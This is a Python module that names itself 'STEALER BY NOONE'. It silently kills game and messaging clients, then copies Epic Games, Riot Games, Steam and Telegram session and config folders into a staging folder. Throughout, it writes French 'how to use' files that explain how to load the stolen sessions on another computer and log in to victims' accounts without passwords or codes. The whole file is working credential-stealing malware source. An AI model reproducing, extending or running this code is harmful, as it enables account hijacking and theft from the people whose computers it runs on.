import subprocess
import shutil
import os
import random

sessions_processes = ["EpicGamesLauncher.exe", "RiotClientCrashHandler.exe", "RiotClientService.exe", "Telegram.exe", "Steam.exe"]

for process in sessions_processes:
    subprocess.run(f"TASKKILL /F /IM {process}", creationflags=subprocess.CREATE_NO_WINDOW)

user = os.getlogin()

how_to_use_EG = r"""
                         ____________________
<=======================[  STEALER BY NOONE  ]======================>
                   ________________________________
<=================[ https:>\\github.com\NoonePYDEV ]=================>

1. Installer Epic Games Launcher
   - Téléchargez et installez l'Epic Games Launcher depuis le site officiel : https:\\www.epicgames.com\store.

2. Fermer le Launcher
   - Une fois installé, fermez complètement le logiciel pour éviter tout conflit.

3. Localiser le dossier de configuration
   - Accédez aux dossiers suivants sur le nouvel ordinateur :

     C:\Program Files (x86)\Epic Games\Launcher\Engine\Config
     C:\Program Files (x86)\Epic Games\Launcher\Portal\Data

   - Si ces dossiers n'existent pas, ouvrez et fermez le Launcher une fois pour qu'il les crée.

4. Remplacer les fichiers
   - Copiez les fichiers récupérés depuis l'ancien ordinateur (ceux extraits par le script).
   - Collez-les dans les dossiers mentionnés ci-dessus.
   - Si le système vous demande de remplacer les fichiers existants, acceptez.

5. Lancer le Launcher
   - Ouvrez l'Epic Games Launcher sur le nouvel ordinateur.
   - Vous serez connecté automatiquement au compte associé aux fichiers de configuration.


"""

how_to_use_STEAM = r"""  
                         ____________________
<=======================[  STEALER BY NOONE  ]======================>
                   ________________________________
<=================[ https:>\\github.com\NoonePYDEV ]=================>

1. Installer Steam
   - Téléchargez et installez Steam depuis le site officiel : https:\\store.steampowered.com.

2. Fermer Steam
   - Une fois installé, fermez complètement Steam pour éviter tout conflit.

3. Localiser le dossier de configuration
   - Accédez aux dossiers suivants sur le nouvel ordinateur :
     C:\Program Files (x86)\Steam\config
     C:\Program Files (x86)\Steam\userdata
   - Si ces dossiers n'existent pas, ouvrez et fermez Steam une fois pour qu'il les crée.

4. Remplacer les fichiers
   - Copiez les fichiers récupérés depuis l'ancien ordinateur (ceux extraits par le script).
   - Collez-les dans les dossiers mentionnés ci-dessus.
   - Si le système vous demande de remplacer les fichiers existants, acceptez.

5. Lancer Steam
   - Ouvrez Steam sur le nouvel ordinateur.
   - Vous serez automatiquement connecté au compte associé aux fichiers de configuration, sauf si une vérification en deux étapes est activée.


"""

how_to_use_TELEGRAM = r"""
                         ____________________
<=======================[  STEALER BY NOONE  ]======================>
                   ________________________________
<=================[ https:>\\github.com\NoonePYDEV ]=================>

1. Installer Telegram Desktop  
   - Téléchargez et installez Telegram Desktop depuis le site officiel : https:\\desktop.telegram.org.

2. Fermer Telegram  
   - Une fois installé, fermez complètement Telegram pour éviter tout conflit.

3. Localiser le dossier de configuration  
   - Accédez au dossier suivant sur le nouvel ordinateur :  
     C:\Users\<VotreNomUtilisateur>\AppData\Roaming\Telegram Desktop\tdata  
   - Si ce dossier n'existe pas, ouvrez et fermez Telegram une fois pour qu'il soit créé.

4. Remplacer les fichiers  
   - Copiez le dossier **tdata** récupéré depuis l'ancien ordinateur (extrait par le script).  
   - Collez ce dossier dans :  
     C:\Users\<VotreNomUtilisateur>\AppData\Roaming\Telegram Desktop\  
   - Si le système vous demande de remplacer les fichiers existants, acceptez.

5. Lancer Telegram  
   - Ouvrez Telegram Desktop sur le nouvel ordinateur.  
   - Vous serez automatiquement connecté au compte associé aux fichiers récupérés, sans besoin de saisir un mot de passe ou un code.  


"""

how_to_use_RIOT = r"""
                         ____________________
<=======================[  STEALER BY NOONE  ]======================>
                   ________________________________
<=================[ https:>\\github.com\NoonePYDEV ]=================>

1. Installer Riot Games Client  
   - Téléchargez et installez le client Riot Games depuis le site officiel : https:\\www.riotgames.com.  

2. Fermer Riot Games Client  
   - Une fois installé, fermez complètement le client pour éviter tout conflit.  

3. Localiser le dossier de configuration  
   - Accédez au dossier suivant sur le nouvel ordinateur :  
     C:\Users\<VotreNomUtilisateur>\AppData\Local\Riot Games  
   - Si ce dossier n'existe pas, ouvrez et fermez le client Riot Games une fois pour qu'il soit créé.  

4. Remplacer les fichiers  
   - Copiez le dossier **Riot Games** récupéré depuis l'ancien ordinateur (extrait par le script).  
   - Collez ce dossier dans :  
     C:\Users\<VotreNomUtilisateur>\AppData\Local\  
   - Si le système vous demande de remplacer les fichiers existants, acceptez.  

5. Lancer Riot Games Client  
   - Ouvrez le client Riot Games sur le nouvel ordinateur.  
   - Vous serez automatiquement connecté au compte associé aux fichiers récupérés.  

   
"""

epicgames_pathes = [r"C:\Program Files (x86)\Epic Games\Launcher\Engine\Config", r"C:\Program Files (x86)\Epic Games\Launcher\Portal\Data"]
riotgames_pathes = [fr"C:\Users\{user}\AppData\Local\Riot Games"]
telegram_pathes = [fr"C:\Users\{user}\AppData\Roaming\Telegram Desktop\tdata"]
steam_pathes = [r"C:\Program Files (x86)\Steam\config", r"C:\Program Files (x86)\Steam\userdata"]

exists = False
os.makedirs(fr"{foldername}\Sessions", exist_ok=True)

try:
    for path in epicgames_pathes:
        if os.path.exists(path):
            exists = True
    if exists == True:
        os.makedirs(fr"{foldername}\Sessions\Epic Games", exist_ok=True)
        for config_dir in epicgames_pathes:
            if os.path.exists(config_dir):
                epic_games = "Epic Games : `Session found`"
                stolen_config_file_path = fr"{foldername}\Sessions\Epic Games\{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                    shutil.rmtree(stolen_config_file_path)
    
                shutil.copytree(config_dir, stolen_config_file_path)
                with open(fr"{foldername}\Sessions\Epic Games\README - How to use.txt", "w", encoding='utf-8')as readme_file:
                    readme_file.write(how_to_use_EG)
            else:
                epic_games = "Epic Games : `No session found`"
 
except:
    epic_games = "` An error occured `"

try:
    for path in riotgames_pathes:
        if os.path.exists(path):
            exists = True
    if exists == True:
        os.makedirs(fr"{foldername}\Sessions\Riot Games", exist_ok=True)
        for config_dir in riotgames_pathes:
            if os.path.exists(config_dir):
                riot_games = "Riot Games : `Session found`"
                stolen_config_file_path = fr"{foldername}\Sessions\Riot Games\{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                    shutil.rmtree(stolen_config_file_path)

                shutil.copytree(config_dir, stolen_config_file_path)
                with open(fr"{foldername}\Sessions\Riot Games\README - How to use.txt", "w", encoding='utf-8') as readme_file:
                    readme_file.write(how_to_use_RIOT)
            else:
                riot_games = "Riot Games : `No session found`"
except:
    riot_games = "` An error occured `"

try: 
    for path in telegram_pathes:
        if os.path.exists(path):
            exists = True 
    if exists == True:
        os.makedirs(fr"{foldername}\Sessions\Telegram", exist_ok=True)
        for config_dir in telegram_pathes:
            if os.path.exists(config_dir):
                telegram = "Telegram : `Session found`"
                stolen_config_file_path = fr"{foldername}\Sessions\Telegram\{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                    shutil.rmtree(stolen_config_file_path)

                shutil.copytree(config_dir, stolen_config_file_path)
                with open(fr"{foldername}\Sessions\Telegram\README - How to use.txt", "w", encoding='utf-8')as readme_file:
                    readme_file.write(how_to_use_TELEGRAM)
            else:
                telegram = "Telegram : `No session found`"
except:
    telegram = "` An error occured `"

try:
    for path in steam_pathes:
        if os.path.exists(path):
            exists = True
    if exists == True:
        os.makedirs(fr"{foldername}\Sessions\Steam", exist_ok=True)
        for config_dir in steam_pathes:
            if os.path.exists(config_dir):
                steam = "Steam : `Session found`"
                stolen_config_file_path = fr"{foldername}\Sessions\Steam\{os.path.basename(config_dir)}"
                if os.path.exists(stolen_config_file_path):
                    shutil.rmtree(stolen_config_file_path)

                shutil.copytree(config_dir, stolen_config_file_path)
                with open(fr"{foldername}\Sessions\Steam\README - How to use.txt", "w", encoding='utf-8')as readme_file:
                    readme_file.write(how_to_use_STEAM)  
            else:
                steam = "Steam : `No session found`"
except:
    steam = "` An error occured `"